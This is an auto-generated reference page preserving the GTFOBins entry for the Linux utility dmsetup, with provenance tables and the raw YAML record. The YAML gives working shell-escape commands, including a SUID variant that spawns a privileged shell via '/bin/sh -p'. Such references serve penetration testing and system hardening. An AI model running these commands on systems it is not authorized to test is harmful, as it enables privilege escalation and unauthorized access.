---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# dmsetup

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `dmsetup` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/dmsetup` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [dmsetup](../../tools/linux/dmsetup.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | dmsetup |
| name | dmsetup |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/dmsetup/ |

## Preserved Source Material

```yaml
_body: ''
_name: dmsetup
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/dmsetup
functions:
  shell:
  - code: 'dmsetup create base <<EOF

      0 3534848 linear /dev/loop0 94208

      EOF

      dmsetup ls --exec ''/bin/sh -s'''
    contexts:
      sudo: null
      suid:
        code: 'dmsetup create base <<EOF

          0 3534848 linear /dev/loop0 94208

          EOF

          dmsetup ls --exec ''/bin/sh -p -s'''
      unprivileged: null
```
